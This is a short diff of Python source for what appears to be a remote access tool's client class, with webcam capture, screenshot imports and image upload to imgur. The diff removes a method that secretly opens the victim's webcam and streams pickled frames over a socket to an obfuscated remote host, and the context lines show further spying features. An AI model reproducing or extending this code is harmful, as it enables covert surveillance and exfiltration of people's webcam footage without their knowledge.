@@ -48,7 +48,6 @@ import sys
 import time
 import json
 import socket
-import pickle
 import subprocess
 from mss import mss
 from uuid import uuid1
@@ -602,19 +601,6 @@ class Client(object):
         dev.release()
         result = self._imgur(tmp)
         return result
-
-    def _webcam_stream(self):
-        dev = VideoCapture(0)
-        s   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self._target(o=long(self.__a__), p=long(self.__b__)), port))
-        while True:
-            ret, frame = dev.read()
-            data = pickle.dumps(frame)
-            try:
-                self._send(pack("L", len(data))+data)
-            except:
-                dev.release()
-                break
 
     def _webcam_video(self):
         fpath   = mktemp(suffix='.avi')
